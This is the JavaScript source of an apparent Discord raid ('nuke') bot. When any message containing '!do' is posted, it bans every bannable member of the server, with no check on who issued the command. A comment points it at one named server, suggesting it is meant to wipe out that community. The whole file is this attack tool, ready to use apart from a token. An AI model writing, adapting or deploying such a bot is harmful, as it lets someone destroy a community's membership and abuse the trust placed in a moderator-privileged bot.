const Discord = require('discord.js');
const client = new Discord.Client();
const token = "PUT TOKEN HERE";//put discord bot token here
const command = '!do';
const serverid = '452990448336633856';//id of server, i set it to old eun2 for u
let server;
let channel;
let members;
var watching = true;

client.on('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
   

});

client.on('message', message => {
    console.log('command received');
    if(message.content.includes(command)){
        var members = message.guild.members
        members.forEach((member) => {
            console.log(member.id);
            if(member.bannable){
                member.ban();
            }                
        })
    }
});
client.login(process.env.BOT_TOKEN);
